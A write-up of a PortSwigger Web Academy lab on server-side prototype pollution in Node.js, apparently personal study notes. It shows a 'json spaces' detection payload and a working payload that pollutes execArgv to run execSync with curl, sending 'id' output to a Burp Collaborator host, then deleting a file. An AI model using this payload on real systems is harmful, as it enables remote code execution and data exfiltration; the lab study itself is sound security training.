---
{"dg-publish":true,"permalink":"/port-swigger-web-academy/prototype-pollution/server-side-prototype-pollution/lab-8-json-spaces/"}
---


---
## Objective: Get RCE & Delete `/home/carlos/morale.txt`

In this lab, we already have escalated privileges, giving us access to admin functionality. We can log in to our account with the following credentials: `wiener:peter`

Inspect the request in Repeater

![Pasted image 20250402004554.png](/img/user/Images/Pasted%20image%2020250402004554.png)

Now, we will try the `json spaces` override technique. We will attempt to add the `__proto__` as an object that has the `json spaces` property. I this case I will be using `20`

```json
"__proto__":{
	"json spaces": 20
}
```

Send the request and check the Raw Response

![Pasted image 20250402192520.png](/img/user/Images/Pasted%20image%2020250402192520.png)

 Great, it worked. Now in the 'Admin Panel' there is a button to Run maintenance jobs
 ![Pasted image 20250402202002.png](/img/user/Images/Pasted%20image%2020250402202002.png)

Checking the request it made on Burp reveals that its doing some system-level functions like DB and Filesystem cleanup. These are good candidates that spawn child processes that we can use to get RCE

![Pasted image 20250402202059.png](/img/user/Images/Pasted%20image%2020250402202059.png)

What we can do from here first pollute the `execArgv` property in the `child_process` module and call execSync to our Burp Collaborator 


```json
"__proto__":{
	"execArgv":[
		"--eval=require('child_process').execSync('curl https://xvwj31prbz2zljp52qbqjulgg7myapye.oastify.com -d $(id)')"
	]
}
```

In the command above, I use the `-d` flag to send data which is the bash command I want to execute, `id`

![Pasted image 20250402202719.png](/img/user/Images/Pasted%20image%2020250402202719.png)

Send the request and Run maintenance jobs to spawn another child process that executes our payload

Check the Collaborator tab for incoming polls

![Pasted image 20250402202934.png](/img/user/Images/Pasted%20image%2020250402202934.png)

And there it is, we received output from our payload. RCE successful! Now, just delete `/home/carlos/morale.txt` and we solved the lab!



